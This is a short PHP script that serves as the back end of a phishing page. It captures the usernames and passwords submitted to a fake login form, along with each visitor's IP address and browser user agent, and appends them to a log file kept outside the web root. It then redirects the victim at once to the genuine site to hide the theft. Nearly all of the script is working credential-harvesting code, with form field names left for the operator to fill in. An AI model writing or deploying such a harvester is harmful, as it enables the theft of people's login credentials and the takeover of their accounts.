<?php
// ----------------------------------------------------------------
// Get user ip address -  keep in mind these headers can be spoofed
// ----------------------------------------------------------------

$client  = @$_SERVER['HTTP_CLIENT_IP'];
$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
$remote  = $_SERVER['REMOTE_ADDR'];

if(filter_var($client, FILTER_VALIDATE_IP))
{
    $ip = "Client IP: $client";
}
elseif(filter_var($forward, FILTER_VALIDATE_IP))
{
    $ip = "Proxied IP: $forward";
}
else
{
    $ip = "Remote IP: $remote";
}

// ----------------------------------------------------------------
// Get user agent -  keep in mind these headers can be spoofed
// ----------------------------------------------------------------

$user_agent = $_SERVER['HTTP_USER_AGENT'];

// ----------------------------------------------------------------
// Get the data from the html form - verify your form field names
// ----------------------------------------------------------------

$username = $_POST["VERIFY ME"];
$password = $_POST["VERIFY ME"];

// ----------------------------------------------------------------
// Append our capture log file - avoid the web root
// ----------------------------------------------------------------

$file = '/home/tristram/capture.txt';
$entry = "Username: $username | Password: $password | $ip | Agent: $user_agent\r\n";
file_put_contents($file, $entry, FILE_APPEND);
?>

<!-- refresh page to the designated url -->
<meta http-equiv="refresh" content="0; url=https://real.example.com" />
